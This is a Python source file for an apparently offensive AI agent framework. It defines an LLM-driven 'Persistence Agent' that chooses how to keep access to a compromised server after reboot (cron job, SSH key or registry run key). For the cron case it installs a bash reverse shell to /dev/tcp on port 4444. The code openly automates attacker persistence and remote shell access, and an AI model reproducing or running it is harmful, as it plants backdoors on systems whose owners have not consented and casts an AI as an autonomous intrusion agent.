import dspy
from .base import BaseRedAgent
from tools.interface import install_cron_persistence

class PersistenceSignature(dspy.Signature):
    """
    You are the Persistence Agent.
    Select a method to maintain access even if the server reboots.
    """
    os_type = dspy.InputField(desc="Target OS (Linux/Windows)")
    privilege_level = dspy.InputField(desc="Current access (User/Root)")
    technique = dspy.OutputField(desc="Persistence method: 'CronJob', 'SSH_Key', 'Registry_Run'")

class PersistenceAgent(BaseRedAgent):
    def __init__(self):
        super().__init__("PERSISTENCE", "Ensure long-term access.")
        self.decider = dspy.ChainOfThought(PersistenceSignature)

    def execute(self, os_type="Linux", is_root=False):
        priv = "Root" if is_root else "User"
        self.log(f"Planning persistence on {os_type} as {priv}...")
        
        plan = self.decider(os_type=os_type, privilege_level=priv)
        
        if "cron" in plan.technique.lower():
            # Ryan needs to implement 'install_cron_persistence'
            return install_cron_persistence("bash -i >& /dev/tcp/100.x.y.z/4444 0>&1")
            
        return {"success": True, "method": plan.technique}